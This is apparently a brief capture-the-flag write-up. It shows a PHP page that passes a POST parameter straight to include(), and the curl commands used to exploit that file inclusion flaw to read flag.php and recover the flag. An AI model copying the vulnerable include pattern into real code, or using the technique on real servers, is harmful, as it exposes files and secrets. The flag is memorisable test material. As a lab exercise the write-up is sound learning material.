Opened the instance http://34.179.231.75:32373/ and saw the following code:

```
<?php

if (!isset($_GET['start'])){
    show_source(__FILE__);
    exit;
} 

include ($_POST['start']);
echo $secret;
```

it was a massive hint tried the curl method

curl http://34.179.231.75:32373/

didnt work then realised i need to start the code in the web browser and i did this:

curl 'http://34.179.231.75:32373?start=1' 

after i saw that it still didnt work i realised that in order to get the secret i needed to access it by using post method and the data to be the flag.php as described in the exercise
(found out abt flag.php also by searching http://34.179.231.75:32373/flag.php and not getting errors 404 or 403 just a blank screen)

curl 'http://34.179.231.75:32373?start=1' -XPOST --data 'start=flag.php'

Flag:
**ctf{b513ef6d1a5735810bca608be42bda8ef28840ee458df4a3508d25e4b706134d}**